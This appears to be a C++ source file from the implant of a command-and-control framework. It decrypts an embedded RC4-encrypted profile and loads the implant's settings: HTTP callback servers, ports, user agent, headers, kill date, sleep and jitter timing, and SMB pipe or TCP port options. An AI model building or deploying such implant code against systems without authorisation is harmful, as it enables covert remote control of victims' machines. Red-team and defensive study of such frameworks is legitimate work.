#include "AgentConfig.h"
#include "Packer.h"
#include "Crypt.h"
#include "utils.h"
#include "config.h"

AgentConfig::AgentConfig()
{
	ULONG length       = 0;
	ULONG size         = getProfileSize();
	CHAR* ProfileBytes = (CHAR*) MemAllocLocal(size);
	memcpy(ProfileBytes, getProfile(), size);

	Packer* packer = (Packer*)MemAllocLocal(sizeof(Packer));
	*packer = Packer( (BYTE*)ProfileBytes, size);
	ULONG profileSize = packer->Unpack32();

	const ULONG CUSTOM_KEY_TAG = 0x59454B43;

	ULONG dataOffset = 4 + profileSize;
	ULONG remaining  = 0;
	if (size > dataOffset) {
		remaining = size - dataOffset;
	}

	PBYTE basePtr   = packer->data();
	PBYTE keySource = basePtr + dataOffset;
	ULONG keyLength = remaining;

	this->encrypt_key_size = 0;

	if (remaining >= sizeof(ULONG) * 2) {
		ULONG tag = 0;
		memcpy(&tag, keySource, sizeof(ULONG));
		if (tag == CUSTOM_KEY_TAG) {
			ULONG requested = 0;
			memcpy(&requested, keySource + sizeof(ULONG), sizeof(ULONG));

			ULONG available = remaining - (sizeof(ULONG) * 2);
			if (requested > available) {
				requested = available;
			}

			keySource += sizeof(ULONG) * 2;
			keyLength = requested;
		}
	}

	if (keyLength == 0) {
		keyLength = remaining;
	}
	if (keyLength == 0) {
		keyLength = 16;
	}
	if (keyLength > 256) {
		keyLength = 256;
	}

	ULONG maxReadable = 0;
	if (size > (ULONG)(keySource - basePtr)) {
		maxReadable = size - (ULONG)(keySource - basePtr);
	}
	if (keyLength > maxReadable) {
		keyLength = maxReadable;
	}
	if (keyLength == 0) {
		keyLength = 16;
	}

	this->encrypt_key_size = keyLength;
	this->encrypt_key = (PBYTE) MemAllocLocal(this->encrypt_key_size);
	if (maxReadable >= this->encrypt_key_size && this->encrypt_key_size != 0) {
		memcpy(this->encrypt_key, keySource, this->encrypt_key_size);
	} else {
		memset(this->encrypt_key, 0, this->encrypt_key_size);
	}

	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, static_cast<int>(this->encrypt_key_size));
	
	this->agent_type = packer->Unpack32();
	
#if defined(BEACON_HTTP)
	this->profile.use_ssl       = packer->Unpack8();
	this->profile.servers_count = packer->Unpack32();
	this->profile.servers       = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
	this->profile.ports         = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
	for (int i = 0; i < this->profile.servers_count; i++) {
		this->profile.servers[i] = packer->UnpackBytesCopy(&length);
		this->profile.ports[i]   = (WORD) packer->Unpack32();
	}
	this->profile.http_method  = packer->UnpackBytesCopy(&length);
	this->profile.uri          = packer->UnpackBytesCopy(&length);
	this->profile.parameter    = packer->UnpackBytesCopy(&length);
	this->profile.user_agent   = packer->UnpackBytesCopy(&length);
	this->profile.http_headers = packer->UnpackBytesCopy(&length);
	this->profile.ans_pre_size = packer->Unpack32();
	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;

	this->listener_type = 0;

	this->kill_date    = packer->Unpack32();
	this->working_time = packer->Unpack32();
	this->sleep_delay  = packer->Unpack32();
	this->jitter_delay = packer->Unpack32();

#elif defined(BEACON_SMB)

	this->profile.pipename = packer->UnpackBytesCopy(&length);
	this->listener_type    = packer->Unpack32();
	this->kill_date        = packer->Unpack32();
	this->working_time     = 0;
	this->sleep_delay      = 0;
	this->jitter_delay     = 0;

#elif defined(BEACON_TCP)
	this->profile.prepend = packer->UnpackBytesCopy(&length);
	this->profile.port    = packer->Unpack32();
	this->listener_type   = packer->Unpack32();
	this->kill_date       = packer->Unpack32();
	this->working_time    = 0;
	this->sleep_delay     = 0;
	this->jitter_delay    = 0;

#endif

	this->download_chunk_size = 0x19000;

	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
	MemFreeLocal((LPVOID*)&ProfileBytes, size);

}
